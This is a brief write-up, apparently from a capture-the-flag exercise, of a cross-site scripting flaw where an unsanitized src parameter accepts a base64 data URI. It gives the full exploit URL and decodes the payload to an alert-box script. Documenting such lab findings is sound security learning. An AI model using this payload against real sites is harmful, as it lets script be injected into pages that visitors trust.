# XSS via Data URI Inclusion

## Vulnerability
Cross-Site Scripting (XSS) through unsanitized `src` parameter

## Target
`http://{IP_ADDRESS}/?page=media&src=nsa`

## Exploit
```url
http://{IP_ADDRESS}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGgiKTs8L3NjcmlwdD4=
```

## Mechanism
- `src` parameter was directly included without sanitization
- Data URI `data:text/html;base64,...` bypassed file inclusion
- Base64 decoded to: `<script>alert("hh");</script>`
- JavaScript executed in context of vulnerable page


